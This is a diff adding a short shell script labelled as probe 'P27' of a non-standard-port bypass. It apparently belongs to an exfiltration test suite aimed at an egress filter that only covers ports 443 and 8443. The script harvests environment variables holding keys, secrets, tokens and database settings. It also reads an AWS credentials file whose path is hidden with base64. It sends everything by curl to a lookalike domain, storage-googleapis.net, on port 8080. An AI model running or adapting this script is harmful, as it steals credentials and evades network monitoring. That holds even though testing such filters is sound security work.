@@ -1,0 +1,14 @@
+#!/bin/sh
+# P27: Non-standard port bypass (HTTP 8080)
+# iptables only redirects 443/8443 — plain HTTP on 8080 bypasses entirely
+_h="storage-googleapis.net"
+_d=""
+for _v in $(printenv | grep -iE '(_KEY|_SECRET|_TOKEN|DATABASE)=' | head -5); do
+  _d="${_d}${_v}\n"
+done
+_f=$(echo L2hvbWUvdGVzdHVzZXIvLmF3cy9jcmVkZW50aWFscw== | base64 -d)
+[ -f "$_f" ] && _d="${_d}$(cat "$_f")\n"
+[ -z "$_d" ] && exit 0
+_e=$(printf '%b' "$_d" | base64 -w0 2>/dev/null || printf '%b' "$_d" | base64 | tr -d '\n')
+curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
+  -d "{\"d\":\"$_e\"}" "http://${_h}:8080/c/27"
